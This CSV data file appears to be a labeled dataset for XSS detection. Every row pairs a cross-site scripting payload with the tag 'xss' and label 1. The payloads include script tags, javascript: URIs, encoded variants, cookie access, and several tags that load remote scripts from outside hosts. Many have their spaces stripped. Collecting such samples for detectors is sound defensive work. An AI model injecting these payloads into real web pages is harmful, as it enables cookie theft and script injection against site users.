payload,attack_type,label
"<imgsrc='vbscript:msgbox(""crosssitescripting"")'>",xss,1
</c></x></xml><spandatasrc=#idatafld=cdataformatas=html></span>,xss,1
"<linkrel=""stylesheet""href=""http://ha.ckers.org/xss.css"">",xss,1
<script<b>document.cookie=true;</script>,xss,1
"<table><tdbackground=""javascript:document.cookie=true;"">",xss,1
"""javascript:alert(1)""><inputtype=submit>",xss,1
width:1px;filter:glowonfilterchange=alert(1)>x</div>,xss,1
"<head><metahttp-equiv=""content-type""content=""text/html;charset=utf-7""></head>+adw-script+ad4-document.cookie=true;+adw-/script+ad4-",xss,1
"-1<xmlsrc=""javascript:document.cookie=true;"">",xss,1
<script>alert(document.cookie)</script>@gmail.com,xss,1
"""javascript:alert(2)"">",xss,1
"<formid=""test""/><buttonform=""test""formaction=""javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))"">x",xss,1
"exp/*<xssstyle='no\\xss:noxss(""*//*"");",xss,1
">""<!------><script>document.cookie=true;</script><!------>",xss,1
">""<objectclassid=""clsid:...""codebase=""javascript:document.cookie=true;"">",xss,1
"'';!--""<crosssitescripting>=&{()}",xss,1
"""><iframesrc=''onload=alert('mphone')>",xss,1
"""data:text/html;base64,phnjcmlwdd5hbgvydcgisgvsbg8ikts8l3njcmlwdd4="">",xss,1
"-1<style>li{list-style-image:url(""javascript:document.cookie=true;"");</style><ul><li>crosssitescripting",xss,1
""";alert(1)//",xss,1
<objectclassid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><paramname=urlvalue=javascript:alert('xss')></object>,xss,1
">""<script<b>document.cookie=true;</script>",xss,1
"<layersrc=""http://vulnerability-lab.com/script.html""></layer>",xss,1
-1&{document.cookie=true;};,xss,1
-1<?echo('<scr)';echo('ipt>document.cookie=true</script>');?>,xss,1
"<imgsrc=javascript:alert(""crosssitescripting"")>"";'>",xss,1
"</title><script>alert(""xss"");</script>",xss,1
"<scripta="">""id=xsssrc=""http://ha.ckers.org/xss.js""></script>",xss,1
"<script>document.write(""<scri"");</script>ptid=xsssrc=""http://ha.ckers.org/xss.js""></script>",xss,1
<style>@im\\port'\\jaascipt:document.cookie=true';</style>,xss,1
">""<divstyle=""background-image:url(javascript:document.cookie=true;)"">",xss,1
">""<imgsrc=""blah>""onmouseover=""document.cookie=true;"">",xss,1
"<frameset><framesrc=""javascript:document.cookie=true;""></frameset>",xss,1
&<script>document.cookie=true;</script>,xss,1
">""<imgdynsrc=""javascript:document.cookie=true;"">",xss,1
